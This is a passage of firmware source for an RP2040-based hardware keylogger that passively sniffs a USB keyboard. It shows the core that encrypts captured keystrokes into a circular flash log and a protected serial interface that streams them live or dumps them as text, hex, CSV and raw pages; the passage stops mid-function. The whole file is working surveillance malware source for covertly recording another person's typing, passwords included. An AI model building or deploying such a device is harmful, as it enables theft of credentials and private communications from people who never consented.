/**
 * @file  KeyloggerSniffer_PIO.ino
 * @brief Core 0 — Encrypted flash storage, serial command interface, LED status.
 *
 * Passive USB keyboard sniffer for RP2040 using PIO hardware capture.
 * Core 0 drains the inter-core ring buffer, encrypts events with
 * XTEA-CTR, persists them into a 1 MB circular CRC-protected flash log,
 * and provides a serial CLI with password protection, multi-language
 * support, and real-time keystroke streaming.
 */

#include <hardware/flash.h>
#include <hardware/sync.h>
#include <hardware/timer.h>
#include <hardware/watchdog.h>
#include "KeylogConfig.h"
#include "SnifferWorker.h"
#include "KeyEncoder.h"
#include "CryptoEngine.h"
#include "LayoutRegistry.h"
#include "I18n.h"

#if defined(PIN_NEOPIXEL) && (PIN_NEOPIXEL >= 0)
    #include <Adafruit_NeoPixel.h>
    static Adafruit_NeoPixel pixels(1, PIN_NEOPIXEL, NEO_GRB + NEO_KHZ800);
    #define HAS_NEOPIXEL 1
#else
    #define HAS_NEOPIXEL 0
#endif

#ifndef XIP_BASE
    #define XIP_BASE 0x10000000
#endif

// =============================================================================
// FLASH WRITER STATE
// =============================================================================

static uint32_t flash_write_offset = 0;
static uint32_t events_logged      = 0;
static uint32_t nonce_counter      = 0;
static uint8_t  page_buffer[FLASH_PAGE_SIZE];
static uint8_t  page_event_count   = 0;
static uint16_t pages_since_meta   = 0;
static uint8_t  meta_slot_idx      = 0;
static bool     has_wrapped        = false;

// =============================================================================
// NONCE FLOOR — Stored in FlashMeta (E2/S4, moved from CryptoHeader)
// =============================================================================

static uint32_t nonce_floor = 0;

// =============================================================================
// OPERATION GUARD
// =============================================================================

static bool operation_active = false;

// =============================================================================
// LOGIN BRUTE-FORCE PROTECTION
// =============================================================================

static uint8_t  login_attempts  = 0;
static uint32_t last_attempt_ms = 0;
#define MAX_FAST_ATTEMPTS 3
#define LOCKOUT_BASE_MS   2000
#define LOCKOUT_MAX_MS    30000

// =============================================================================
// READ PIN BRUTE-FORCE PROTECTION
// =============================================================================

static uint8_t  rpin_attempts     = 0;
static uint32_t rpin_last_attempt = 0;

// =============================================================================
// PERIODIC FLUSH + SESSION COUNTER + FW CRC + CMD OVERFLOW
// =============================================================================

static uint32_t last_flush_ms    = 0;
static uint16_t session_counter  = 0;
static uint32_t boot_fw_crc32    = 0;
static bool     cmd_overflow     = false;
static bool     layout_auto_detected = false;

// =============================================================================
// FLASH WEAR COUNTERS (E3)
// =============================================================================

uint32_t flash_wear_meta_erases = 0;
uint32_t flash_wear_log_erases  = 0;

// =============================================================================
// USER EPOCH TIMESTAMP (U3)
// =============================================================================

uint32_t user_epoch_seconds = 0;
uint32_t epoch_set_millis   = 0;

// =============================================================================
// LIVE MODE FLAGS (U4)
// =============================================================================

// Defined in sniffer_worker.cpp (extern in keylog_config.h):
// volatile bool live_mode_active;
// volatile bool live_clean_mode;  — We define it here since sniffer doesn't use it.
volatile bool live_clean_mode = false;

// =============================================================================
// LED HELPER
// =============================================================================

static void setColor(uint8_t r, uint8_t g, uint8_t b) {
#if HAS_NEOPIXEL
    pixels.setPixelColor(0, pixels.Color(r, g, b));
    pixels.show();
#else
    (void)r; (void)g; (void)b;
#endif
}

// =============================================================================
// LOW-LEVEL FLASH OPERATIONS
// =============================================================================

static void flashOp(bool erase, uint32_t abs_offset, const uint8_t* data) {
    bool need_handshake = core1_running;
    bool handshake_ok   = true;

    if (need_handshake) {
        core0_request_pause = true;
        memory_barrier();
        uint32_t start_us = time_us_32();
        while (!core1_ack_pause) {
            if ((time_us_32() - start_us) >= PAUSE_HANDSHAKE_TIMEOUT_US) {
                handshake_ok = false;
                setColor(255, 255, 0);
                if (Serial) Serial.println("[WARN] Core 1 pause timeout");
                break;
            }
            tight_loop_contents();
        }
        memory_barrier();
    }

    uint32_t ints = save_and_disable_interrupts();
    if (erase) {
        flash_range_erase(abs_offset, FLASH_SECTOR_SIZE);
    } else {
        flash_range_program(abs_offset, data, FLASH_PAGE_SIZE);
    }
    restore_interrupts(ints);

    if (need_handshake) {
        core0_request_pause = false;
        memory_barrier();
        if (!handshake_ok) delayMicroseconds(100);
    }
}

static inline void eraseLogSector(uint32_t sector_offset) {
    flashOp(true, FLASH_LOG_START + sector_offset, nullptr);
    flash_wear_log_erases++;
}

static inline void programLogPage(uint32_t page_offset) {
    flashOp(false, FLASH_LOG_START + page_offset, page_buffer);
}

// =============================================================================
// PAGE SEAL — Encrypt + CRC
// =============================================================================

static void sealPageBuffer(uint32_t page_offset) {
    uint16_t used_bytes = page_event_count * sizeof(PackedEvent);
    if (used_bytes < PAGE_COUNT_OFFSET) {
        memset(&page_buffer[used_bytes], 0, PAGE_COUNT_OFFSET - used_bytes);
    }
    page_buffer[PAGE_COUNT_OFFSET] = page_event_count;
    page_buffer[PAGE_FLAGS_OFFSET] = 0x00;
    page_buffer[PAGE_NONCE_OFFSET]     =  nonce_counter        & 0xFF;
    page_buffer[PAGE_NONCE_OFFSET + 1] = (nonce_counter >> 8)  & 0xFF;
    page_buffer[PAGE_NONCE_OFFSET + 2] = (nonce_counter >> 16) & 0xFF;
    page_buffer[PAGE_NONCE_OFFSET + 3] = (nonce_counter >> 24) & 0xFF;
    cryptoEncryptPage(page_buffer, nonce_counter);
    nonce_counter++;
    uint16_t crc = calcCRC16(page_buffer, PAGE_CRC_OFFSET);
    page_buffer[PAGE_CRC_OFFSET]     = crc & 0xFF;
    page_buffer[PAGE_CRC_OFFSET + 1] = (crc >> 8) & 0xFF;
}

// =============================================================================
// PAGE READER
// =============================================================================

static uint32_t readPageNonce(const uint8_t* page) {
    return page[PAGE_NONCE_OFFSET]
         | ((uint32_t)page[PAGE_NONCE_OFFSET + 1] << 8)
         | ((uint32_t)page[PAGE_NONCE_OFFSET + 2] << 16)
         | ((uint32_t)page[PAGE_NONCE_OFFSET + 3] << 24);
}

static const uint8_t* readPageValidated(uint32_t page_offset, uint8_t& out_count) {
    const uint8_t* page = (const uint8_t*)(XIP_BASE + FLASH_LOG_START + page_offset);
    out_count = page[PAGE_COUNT_OFFSET];
    if (out_count == 0xFF || out_count > EVENTS_PER_PAGE || out_count == 0) {
        out_count = 0; return nullptr;
    }
    uint16_t stored_crc = page[PAGE_CRC_OFFSET] | ((uint16_t)page[PAGE_CRC_OFFSET + 1] << 8);
    if (stored_crc != calcCRC16(page, PAGE_CRC_OFFSET)) { out_count = 0; return nullptr; }
    return page;
}

// =============================================================================
// COUNT EVENTS IN SECTOR — For accurate events_logged on wrap (R3)
// =============================================================================

/**
 * @brief Count total events in all valid pages of a sector about to be erased.
 * @param sector_offset  Offset within the log region (sector-aligned).
 * @return Total event count across all valid pages in the sector.
 */
static uint32_t countEventsInSector(uint32_t sector_offset) {
    uint32_t total = 0;
    uint32_t pages_per_sector = FLASH_SECTOR_SIZE / FLASH_PAGE_SIZE;
    for (uint32_t p = 0; p < pages_per_sector; p++) {
        uint32_t page_offset = sector_offset + p * FLASH_PAGE_SIZE;
        const uint8_t* page = (const uint8_t*)(XIP_BASE + FLASH_LOG_START + page_offset);
        uint8_t count = page[PAGE_COUNT_OFFSET];
        if (count != 0xFF && count <= EVENTS_PER_PAGE) {
            total += count;
        }
    }
    return total;
}

// =============================================================================
// METADATA JOURNAL — With nonce_floor in FlashMeta (E2)
// =============================================================================

static void persistMetadata() {
    if (meta_slot_idx >= META_ENTRIES_MAX) {
        flashOp(true, FLASH_META_START, nullptr);
        flash_wear_meta_erases++;
        meta_slot_idx = 0;
    }

    // Advance nonce floor (E2 — replay protection)
    nonce_floor = nonce_counter;

    uint8_t meta_page[FLASH_PAGE_SIZE];
    memset(meta_page, 0xFF, FLASH_PAGE_SIZE);
    FlashMeta* m      = (FlashMeta*)meta_page;
    m->magic          = META_MAGIC;
    m->write_offset   = flash_write_offset;
    m->events_logged  = events_logged;
    m->nonce_counter  = nonce_counter;
    m->boot_uptime_ms = millis();
    m->nonce_floor    = nonce_floor;
    m->_reserved      = 0;
    m->crc16          = calcCRC16(meta_page, META_CRC_SPAN);

    flashOp(false, FLASH_META_START + (uint32_t)meta_slot_idx * FLASH_PAGE_SIZE, meta_page);
    meta_slot_idx++;
    pages_since_meta = 0;
}

static bool recoverFromMetadata() {
    for (int i = META_ENTRIES_MAX - 1; i >= 0; i--) {
        const FlashMeta* m = (const FlashMeta*)(
            XIP_BASE + FLASH_META_START + i * FLASH_PAGE_SIZE);
        if (m->magic != META_MAGIC) continue;
        if (calcCRC16((const uint8_t*)m, META_CRC_SPAN) != m->crc16) continue;
        if (m->write_offset > FLASH_LOG_SIZE) continue;

        flash_write_offset = m->write_offset;
        events_logged      = m->events_logged;
        nonce_counter      = m->nonce_counter;
        nonce_floor        = m->nonce_floor;
        meta_slot_idx      = (uint8_t)(i + 1);

        // Enforce nonce floor (E2)
        if (nonce_counter < nonce_floor) nonce_counter = nonce_floor;

        // Forward scan
        uint32_t scan_offset = flash_write_offset;
        uint32_t pages_reclaimed = 0;
        while (true) {
            if (scan_offset >= FLASH_LOG_SIZE) scan_offset = 0;
            const uint8_t* page = (const uint8_t*)(XIP_BASE + FLASH_LOG_START + scan_offset);
            if (page[PAGE_COUNT_OFFSET] == 0xFF) break;
            uint8_t count = page[PAGE_COUNT_OFFSET];
            if (count == 0 || count > EVENTS_PER_PAGE) break;
            uint16_t sc = page[PAGE_CRC_OFFSET] | ((uint16_t)page[PAGE_CRC_OFFSET + 1] << 8);
            if (sc != calcCRC16(page, PAGE_CRC_OFFSET)) break;
            uint32_t pn = readPageNonce(page);
            if (pn < nonce_floor) break;  // Replay detected
            if (pn >= nonce_counter) nonce_counter = pn + 1;
            events_logged += count;
            scan_offset += FLASH_PAGE_SIZE;
            pages_reclaimed++;
            if (pages_reclaimed >= META_PERSIST_INTERVAL + 2) break;
        }
        flash_write_offset = scan_offset;
        return true;
    }
    return false;
}

static void recoverByScan() {
    flash_write_offset = 0;
    events_logged      = 0;
    nonce_counter      = 0;
    has_wrapped        = false;
    // nonce_floor stays as initialized (0 on fresh boot)
    if (nonce_counter < nonce_floor) nonce_counter = nonce_floor;

    bool found_frontier = false;
    for (uint32_t off = 0; off < FLASH_LOG_SIZE; off += FLASH_PAGE_SIZE) {
        const uint8_t* page = (const uint8_t*)(XIP_BASE + FLASH_LOG_START + off);
        if (page[PAGE_COUNT_OFFSET] == 0xFF) {
            flash_write_offset = off;
            found_frontier = true;
            break;
        }
    }
    if (!found_frontier) { flash_write_offset = 0; has_wrapped = true; }

    if (found_frontier) {
        uint32_t chk = (flash_write_offset + FLASH_SECTOR_SIZE) % FLASH_LOG_SIZE;
        const uint8_t* p = (const uint8_t*)(XIP_BASE + FLASH_LOG_START + chk);
        uint8_t c = p[PAGE_COUNT_OFFSET];
        if (c != 0xFF && c <= EVENTS_PER_PAGE && c > 0) has_wrapped = true;
    }

    for (uint32_t off = 0; off < FLASH_LOG_SIZE; off += FLASH_PAGE_SIZE) {
        const uint8_t* page = (const uint8_t*)(XIP_BASE + FLASH_LOG_START + off);
        uint8_t count = page[PAGE_COUNT_OFFSET];
        if (count != 0xFF && count <= EVENTS_PER_PAGE) {
            events_logged += count;
            uint32_t pn = readPageNonce(page);
            if (pn >= nonce_counter) nonce_counter = pn + 1;
        }
    }
}

static void detectWraparound() {
    if (flash_write_offset == 0 && events_logged == 0) { has_wrapped = false; return; }
    uint32_t chk = (flash_write_offset + FLASH_SECTOR_SIZE) % FLASH_LOG_SIZE;
    const uint8_t* p = (const uint8_t*)(XIP_BASE + FLASH_LOG_START + chk);
    uint8_t c = p[PAGE_COUNT_OFFSET];
    has_wrapped = (c != 0xFF && c <= EVENTS_PER_PAGE && c > 0);
}

// =============================================================================
// SESSION MARKER
// =============================================================================

static void injectSessionMarker() {
    uint16_t next = (head_idx + 1) % RAM_BUFFER_SIZE;
    if (next == tail_idx) return;
    ram_buffer[head_idx].scancode = SCANCODE_SESSION_MARKER;
    ram_buffer[head_idx].meta     = (uint8_t)(session_counter & 0xFF);
    ram_buffer[head_idx].delta_ms = 0;
    memory_barrier();
    head_idx = next;
    session_counter++;
}

// =============================================================================
// AUTO-DETECT LAYOUT
// =============================================================================

static void checkAutoDetectLayout(const PackedEvent& ev) {
    if (layout_auto_detected) return;
    if (ev.scancode == 0x87 && getActiveLayoutId() != LAYOUT_ID_ABNT2) {
        setActiveLayout(LAYOUT_ID_ABNT2);
        cryptoSetLayoutId(LAYOUT_ID_ABNT2, flashOp);
        layout_auto_detected = true;
        if (Serial) Serial.println(i18n->info_abnt2_detected);
    }
}

// =============================================================================
// RING BUFFER → FLASH PERSISTENCE (R3 — accurate events_logged on wrap)
// =============================================================================

static void commitCurrentPage() {
    setColor(255, 0, 0);

    if (flash_write_offset % FLASH_SECTOR_SIZE == 0) {
        if (has_wrapped) {
            uint32_t overwritten = countEventsInSector(flash_write_offset);
            if (events_logged >= overwritten) {
                events_logged -= overwritten;
            }
        }
        eraseLogSector(flash_write_offset);
    }

    sealPageBuffer(flash_write_offset);
    programLogPage(flash_write_offset);
    flash_write_offset += FLASH_PAGE_SIZE;
    pages_since_meta++;

    if (flash_write_offset >= FLASH_LOG_SIZE) {
        flash_write_offset = 0;
        has_wrapped = true;
    }
    if (pages_since_meta >= META_PERSIST_INTERVAL) {
        persistMetadata();
    }
    page_event_count = 0;
}

static void processWriteQueue(bool force) {
    if (!cryptoIsUnlocked()) return;
    bool wrote = false;

    while (true) {
        memory_barrier();
        if (tail_idx == head_idx) break;

        PackedEvent ev;
        ev.scancode = ram_buffer[tail_idx].scancode;
        ev.meta     = ram_buffer[tail_idx].meta;
        ev.delta_ms = ram_buffer[tail_idx].delta_ms;
        memory_barrier();
        tail_idx = (tail_idx + 1) % RAM_BUFFER_SIZE;

        checkAutoDetectLayout(ev);

        // LIVE mode streaming (U4 — clean mode suppresses modifier tags)
        if (live_mode_active && Serial) {
            bool is_modifier = (ev.scancode >= 0xE0 && ev.scancode <= 0xE7);
            if (!(live_clean_mode && is_modifier)) {
                char text[35];
                decodeEventToText(ev, text);
                if (text[0] != '\0') {
                    Serial.print(text);
                    if (strcmp(text, "[ENT]") == 0 || strcmp(text, "[NENT]") == 0)
                        Serial.println();
                }
            }
        }

        uint16_t byte_offset = page_event_count * sizeof(PackedEvent);
        memcpy(&page_buffer[byte_offset], &ev, sizeof(PackedEvent));
        page_event_count++;
        events_logged++;

        if (page_event_count >= EVENTS_PER_PAGE) {
            commitCurrentPage();
            wrote = true;
        }
    }

    if (force && page_event_count > 0) {
        commitCurrentPage();
        persistMetadata();
        wrote = true;
    }
    if (wrote) {
        setColor(0, 255, 0);
        last_flush_ms = millis();
    }
}

// =============================================================================
// SERIAL FLOW CONTROL — With timeout + watchdog (R2/R5)
// =============================================================================

/**
 * @brief Wait for serial TX buffer space, with 5s timeout and watchdog kick.
 * @return true if space became available, false on timeout.
 */
static bool serialFlowWait() {
    if (Serial.availableForWrite() >= 32) return true;
    uint32_t start = millis();
    while (Serial.availableForWrite() < 128) {
        watchdog_update();
        if ((millis() - start) >= SERIAL_FLOW_TIMEOUT_MS) return false;
        yield();
    }
    return true;
}

// =============================================================================
// CIRCULAR PAGE ITERATOR — With progress (U1) + watchdog (R1)
// =============================================================================

static uint32_t iteratePages(
    bool (*visitor)(const uint8_t*, uint8_t, uint32_t),
    bool show_progress
) {
    uint32_t total_pages = FLASH_LOG_SIZE / FLASH_PAGE_SIZE;
    uint32_t start_page, pages_to_scan;

    if (has_wrapped) {
        start_page    = flash_write_offset / FLASH_PAGE_SIZE;
        pages_to_scan = total_pages;
    } else {
        start_page    = 0;
        pages_to_scan = flash_write_offset / FLASH_PAGE_SIZE;
    }

    uint32_t event_total = 0;
    uint32_t quarter = (pages_to_scan > 100) ? pages_to_scan / 4 : 0;

    for (uint32_t i = 0; i < pages_to_scan; i++) {
        if (i % 64 == 0) watchdog_update();
        if (show_progress && quarter > 0) {
            if (i == quarter)     Serial.println("[INFO] 25% ...");
            if (i == quarter * 2) Serial.println("[INFO] 50% ...");
            if (i == quarter * 3) Serial.println("[INFO] 75% ...");
        }

        uint32_t page_idx    = (start_page + i) % total_pages;
        uint32_t page_offset = page_idx * FLASH_PAGE_SIZE;

        uint8_t count;
        const uint8_t* page = readPageValidated(page_offset, count);
        if (page == nullptr) continue;
        event_total += count;
        if (!visitor(page, count, page_offset)) break;
    }
    return event_total;
}

// =============================================================================
// DATA ACCESS VERIFICATION — Unified (S2 scrub handled in parser)
// =============================================================================

static bool checkPinLockout() {
    if (rpin_attempts < RPIN_MAX_FAST_ATTEMPTS) return true;
    uint32_t delay_ms = RPIN_LOCKOUT_BASE_MS;
    uint8_t extra = rpin_attempts - RPIN_MAX_FAST_ATTEMPTS;
    for (uint8_t i = 0; i < extra && delay_ms < RPIN_LOCKOUT_MAX_MS; i++) delay_ms *= 2;
    if (delay_ms > RPIN_LOCKOUT_MAX_MS) delay_ms = RPIN_LOCKOUT_MAX_MS;
    uint32_t elapsed = millis() - rpin_last_attempt;
    if (elapsed < delay_ms) {
        Serial.printf(i18n->lockout_wait,
                      (unsigned long)((delay_ms - elapsed) / 1000 + 1));
        return false;
    }
    return true;
}

static bool verifyDataAccess(const char* credential) {
    if (cryptoHasUserPassword()) {
        if (credential == nullptr || !cryptoVerifyPassword(credential)) {
            Serial.println(i18n->err_wrong_pwd);
            return false;
        }
        return true;
    }
    if (!cryptoHasReadPin()) return true;
    if (!checkPinLockout()) return false;
    rpin_last_attempt = millis();
    if (credential == nullptr || !cryptoVerifyReadPin(credential)) {
        rpin_attempts++;
        Serial.printf(i18n->err_wrong_pin_fmt, rpin_attempts, (uint8_t)RPIN_MAX_FAST_ATTEMPTS); Serial.println();
        return false;
    }
    rpin_attempts = 0;
    return true;
}

// =============================================================================
// TEXT DUMP — With watchdog (R1), progress (U1), flow timeout (R2)
// =============================================================================

static uint32_t dump_event_counter = 0;

static bool textDumpVisitor(const uint8_t* page, uint8_t count, uint32_t page_offset) {
    if (cancel_request) { Serial.println(i18n->op_cancelled); return false; }
    uint8_t decrypted[PAGE_COUNT_OFFSET];
    memcpy(decrypted, page, PAGE_COUNT_OFFSET);
    cryptoDecryptPage(decrypted, readPageNonce(page));
    for (uint8_t i = 0; i < count; i++) {
        const PackedEvent* ev = (const PackedEvent*)&decrypted[i * sizeof(PackedEvent)];
        if (ev->delta_ms >= 1000) Serial.printf("[+%us]", ev->delta_ms / 1000);
        char text[35];
        decodeEventToText(*ev, text);
        if (text[0] != '\0') {
            Serial.print(text);
            if (strcmp(text, "[ENT]") == 0 || strcmp(text, "[NENT]") == 0) Serial.println();
            dump_event_counter++;
        }
        if (dump_event_counter % 64 == 0 && !serialFlowWait()) return false;
    }
    return true;
}

static void executeTextDump(const char* cred) {
    operation_active = true;
    if (!verifyDataAccess(cred)) { operation_active = false; return; }
    processWriteQueue(true);
    setColor(0, 0, 255);
    Serial.println(i18n->op_text_dump_start);
    dump_event_counter = 0;
    (void)iteratePages(textDumpVisitor, true);
    Serial.printf("\n--- TEXT DUMP END (%lu events) ---\n", dump_event_counter);
    Serial.flush();
    dump_request = false; cancel_request = false;
    operation_active = false;
    setColor(0, 255, 0);
}

// =============================================================================
// HEX DUMP
// =============================================================================

static uint32_t hex_event_counter = 0;

static bool hexDumpVisitor(const uint8_t* page, uint8_t count, uint32_t page_offset) {
    if (cancel_request) { Serial.println(i18n->op_cancelled); return false; }
    uint8_t decrypted[PAGE_COUNT_OFFSET];
    memcpy(decrypted, page, PAGE_COUNT_OFFSET);
    cryptoDecryptPage(decrypted, readPageNonce(page));
    for (uint8_t i = 0; i < count; i++) {
        const PackedEvent* ev = (const PackedEvent*)&decrypted[i * sizeof(PackedEvent)];
        Serial.printf("%02X%02X%04X ", ev->scancode, ev->meta, ev->delta_ms);
        hex_event_counter++;
        if (hex_event_counter % 8 == 0) Serial.println();
        if (hex_event_counter % 64 == 0 && !serialFlowWait()) return false;
    }
    return true;
}

static void executeHexDump(const char* cred) {
    operation_active = true;
    if (!verifyDataAccess(cred)) { operation_active = false; return; }
    processWriteQueue(true);
    setColor(0, 255, 255);
    Serial.println(i18n->op_hex_dump_start);
    hex_event_counter = 0;
    (void)iteratePages(hexDumpVisitor, true);
    Serial.printf("\n--- HEX DUMP END (%lu events) ---\n", hex_event_counter);
    Serial.flush();
    dump_hex_request = false; cancel_request = false;
    operation_active = false;
    setColor(0, 255, 0);
}

// =============================================================================
// CSV EXPORT — Skip-decryption optimization (E1), single-pass (R3 fix)
// =============================================================================

static uint32_t export_event_counter = 0;
static uint32_t export_time_ms       = 0;

static void executeExport(const char* cred, uint32_t last_n) {
    operation_active = true;
    if (!verifyDataAccess(cred)) { operation_active = false; return; }
    processWriteQueue(true);
    setColor(0, 0, 255);

    uint32_t skip_count = 0;
    if (last_n > 0 && events_logged > last_n) {
        skip_count = events_logged - last_n;
        Serial.printf(i18n->info_skipping, skip_count); Serial.println();
    }

    Serial.println("# format_version=2");
    Serial.printf("# boot_uptime_ms=%lu\n", millis());
    if (user_epoch_seconds > 0) {
        uint32_t now_epoch = user_epoch_seconds + (millis() - epoch_set_millis) / 1000;
        Serial.printf("# epoch_base=%lu\n", (unsigned long)now_epoch);
    }
    if (last_n > 0) Serial.printf("# filter=last_%lu\n", last_n);
    Serial.println("timestamp_ms,scancode,meta,text");

    export_event_counter = 0;
    export_time_ms       = 0;
    uint32_t skipped = 0;
    uint32_t total_pages_it = FLASH_LOG_SIZE / FLASH_PAGE_SIZE;
    uint32_t start_page = has_wrapped ? flash_write_offset / FLASH_PAGE_SIZE : 0;
    uint32_t pages_to_scan = has_wrapped ? total_pages_it : flash_write_offset / FLASH_PAGE_SIZE;

    for (uint32_t i = 0; i < pages_to_scan; i++) {
        if (cancel_request) { Serial.println(i18n->op_cancelled); break; }
        if (i % 64 == 0) watchdog_update();
        uint32_t pi = (start_page + i) % total_pages_it;
        uint32_t po = pi * FLASH_PAGE_SIZE;

        uint8_t count;
        const uint8_t* page = readPageValidated(po, count);
        if (page == nullptr) continue;
        if (skipped + count <= skip_count) {
            skipped += count;
            continue;
        }

        uint8_t decrypted[PAGE_COUNT_OFFSET];
        memcpy(decrypted, page, PAGE_COUNT_OFFSET);
        cryptoDecryptPage(decrypted, readPageNonce(page));

        for (uint8_t j = 0; j < count; j++) {
            const PackedEvent* ev = (const PackedEvent*)&decrypted[j * sizeof(PackedEvent)];
            export_time_ms += ev->delta_ms;
            if (skipped < skip_count) { skipped++; continue; }

            if (ev->scancode == SCANCODE_SESSION_MARKER) {
                Serial.printf("# session_start=%u,timestamp_ms=%lu\n", ev->meta, export_time_ms);
                export_event_counter++;
                continue;
            }
            char text[35];
            decodeEventToText(*ev, text);
            bool needs_quote = false;
            for (uint8_t k = 0; text[k]; k++) {
                if (text[k] == ',' || text[k] == '"') { needs_quote = true; break; }
            }
            if (needs_quote)
                Serial.printf("%lu,0x%02X,0x%02X,\"%s\"\n", export_time_ms, ev->scancode, ev->meta, text);
            else
                Serial.printf("%lu,0x%02X,0x%02X,%s\n", export_time_ms, ev->scancode, ev->meta, text);
            export_event_counter++;
            if (export_event_counter % 64 == 0 && !serialFlowWait()) break;
        }
    }
    Serial.printf("# total_events=%lu\n", export_event_counter);
    Serial.flush();
    cancel_request = false; operation_active = false;
    setColor(0, 255, 0);
}

// =============================================================================
// RAWDUMP — Now requires authentication (S3)
// =============================================================================

static void executeRawDump(const char* cred) {
    operation_active = true;
    if (!verifyDataAccess(cred)) { operation_active = false; return; }
    processWriteQueue(true);
    setColor(0, 255, 255);
    Serial.println(i18n->op_rawdump_start);
    uint8_t enc_dek[16], raw_salt[8]; uint8_t raw_flags;
    cryptoGetRawDumpHeader(enc_dek, raw_salt, &raw_flags);
    Serial.print("# salt=");
    for (uint8_t i = 0; i < 8; i++) Serial.printf("%02X", raw_salt[i]);
    Serial.println();
    Serial.print("# enc_dek=");
    for (uint8_t i = 0; i < 16; i++) Serial.printf("%02X", enc_dek[i]);
    Serial.println();
    Serial.printf("# flags=0x%02X\n", raw_flags);
    Serial.printf("# page_size=%u\n", FLASH_PAGE_SIZE);
    Serial.printf("# nonce_offset=%u\n", PAGE_NONCE_OFFSET);
    Serial.printf("# count_offset=%u\n", PAGE_COUNT_OFFSET);
    Serial.println("# dump_version=3");

    uint32_t tp = FLASH_LOG_SIZE / FLASH_PAGE_SIZE;
    uint32_t sp = has_wrapped ? flash_write_offset / FLASH_PAGE_SIZE : 0;
    uint32_t np = has_wrapped ? tp : flash_write_offset / FLASH_PAGE_SIZE;
    uint32_t pc = 0;
    for (uint32_t i = 0; i < np; i++) {
        if (cancel_request) { Serial.println(i18n->op_cancelled); break; }
        if (i % 64 == 0) watchdog_update();
        uint32_t po = ((sp + i) % tp) * FLASH_PAGE_SIZE;
        uint8_t cnt;
        const uint8_t* page = readPageValidated(po, cnt);
        if (page == nullptr) continue;
        for (uint16_t b = 0; b < FLASH_PAGE_SIZE; b++) Serial.printf("%02X", page[b]);
        Serial.println();
        pc++;
        if (pc % 16 == 0 && !serialFlowWait()) break;
    }
    Serial.printf("--- RAWDUMP END (%lu pages) ---\n", pc);
    Serial.flush();
    cancel_request = false; operation_active = false;
    setColor(0, 255, 0);
}

// =============================================================================
// READ PIN, PASSWORD, LOCK, UNLOCK, LOGIN, ERASE, LAYOUT — Same as v2.3.0
// (with S1 fix in executeLock)
// =============================================================================

static void executeSetReadPin(const char* pin) {
    if (!cryptoIsUnlocked()) { Serial.println(i18n->err_not_unlocked); return; }
    if (strlen(pin) != READ_PIN_LEN) { Serial.println(i18n->err_pin_must_4); return; }
    for (uint8_t i = 0; i < READ_PIN_LEN; i++) {
        if (pin[i] < '0' || pin[i] > '9') { Serial.println(i18n->err_pin_only_digits); return; }
    }
    Serial.println(i18n->op_pin_hashing); Serial.flush();
    if (cryptoSetReadPin(pin, flashOp)) {
        Serial.println(i18n->op_pin_set);
        Serial.println(i18n->op_pin_required);
    } else {
        Serial.println(i18n->err_pin_set_failed);
    }
}

static void executeClearReadPin(const char* pin) {
    if (!cryptoIsUnlocked()) { Serial.println(i18n->err_not_unlocked); return; }
    if (cryptoClearReadPin(pin, flashOp)) {
        Serial.println(i18n->op_pin_removed);
        rpin_attempts = 0;
    } else {
        Serial.println(i18n->err_wrong_pin_or_none);
    }
}

static void executePasswordChange(const char* old_pass, const char* new_pass) {
    operation_active = true;
    setColor(255, 255, 255);
    Serial.println(i18n->op_changing_pwd);
    bool ok = cryptoChangePassword(old_pass, new_pass, flashOp);
    Serial.println(ok ? i18n->op_pwd_changed
                      : i18n->err_wrong_old_pwd);
    Serial.flush();
    operation_active = false;
    setColor(cryptoIsUnlocked() ? 0 : 255, cryptoIsUnlocked() ? 255 : 165, 0);
}

/**
 * @brief LOCK — Set user password.
 * @details S1 fix: cryptoZeroDek() is now ACTIVE. After LOCK, the DEK is wiped
 *          from RAM. Capture pauses until the next LOGIN or reboot. This prevents
 *          a RAM dump from recovering the key after the user has explicitly locked.
 */
static void executeLock(const char* password) {
    operation_active = true;
    setColor(255, 255, 255);
    Serial.println(i18n->op_locking); Serial.flush();
    processWriteQueue(true);
    bool ok = cryptoSetUserPassword(password, flashOp);
    if (ok) {
        cryptoZeroDek();
        Serial.println(i18n->op_locked_ok);
        Serial.println(i18n->op_dek_wiped);
        Serial.println(i18n->op_login_next_boot);
        Serial.println(i18n->op_login_to_resume);
        setColor(255, 165, 0);  // Orange: locked/awaiting LOGIN
    } else {
        Serial.println(i18n->err_lock_failed);
        setColor(0, 255, 0);
    }
    Serial.flush();
    operation_active = false;
}

static void executeUnlock(const char* password) {
    operation_active = true;
    setColor(255, 255, 255);
    Serial.println(i18n->op_removing_pwd); Serial.flush();
    bool ok = cryptoRemoveUserPassword(password, flashOp);
    Serial.println(ok ? i18n->op_pwd_removed
                      : i18n->err_wrong_pwd);
    Serial.flush();
    operation_active = false;
    setColor(0, 255, 0);
}

static void executeLogin(const char* password) {
    if (cryptoIsUnlocked()) { Serial.println(i18n->info_already_unlocked); return; }
    if (login_attempts >= MAX_FAST_ATTEMPTS) {
        uint32_t d = LOCKOUT_BASE_MS;
        for (uint8_t i = 0; i < login_attempts - MAX_FAST_ATTEMPTS && d < LOCKOUT_MAX_MS; i++) d *= 2;
        if (d > LOCKOUT_MAX_MS) d = LOCKOUT_MAX_MS;
        if ((millis() - last_attempt_ms) < d) {
            Serial.printf(i18n->lockout_wait, (unsigned long)((d - (millis() - last_attempt_ms)) / 1000 + 1));
            return;
        }
    }
    last_attempt_ms = millis();
    Serial.println(i18n->op_unlocking_kdf); Serial.flush();
    uint32_t t0 = millis();
    bool ok = cryptoUnlock(password);
    uint32_t elapsed = millis() - t0;
    if (ok) {
        Serial.print("--- "); Serial.print(i18n->op_unlocked_ok);
        Serial.printf(" (%lu ms) ---\n", elapsed);
        setColor(0, 255, 0);
        login_attempts = 0;
        injectSessionMarker();
    } else {
        login_attempts++;
        Serial.printf(i18n->err_wrong_pwd_fmt, login_attempts, MAX_FAST_ATTEMPTS); Serial.println();
        setColor(255, 165, 0);
    }
    Serial.flush();
}

static void executeErase() {
    operation_active = true;
    setColor(255, 0, 255);
    Serial.println(i18n->op_erasing);
    uint32_t sectors = FLASH_LOG_SIZE / FLASH_SECTOR_SIZE;
    for (uint32_t i = 0; i < sectors; i++) {
        eraseLogSector(i * FLASH_SECTOR_SIZE);
        if (i % 32 == 0) { watchdog_update(); Serial.printf(i18n->op_erase_progress, i, sectors); Serial.println(); }
    }
    flashOp(true, FLASH_META_START, nullptr); flash_wear_meta_erases++;
    cryptoReset(flashOp);
    flash_write_offset = 0; events_logged = 0; nonce_counter = 0;
    nonce_floor = 0; page_event_count = 0; pages_since_meta = 0;
    meta_slot_idx = 0; has_wrapped = false; head_idx = 0; tail_idx = 0;
    overflow_count = 0; login_attempts = 0; rpin_attempts = 0;
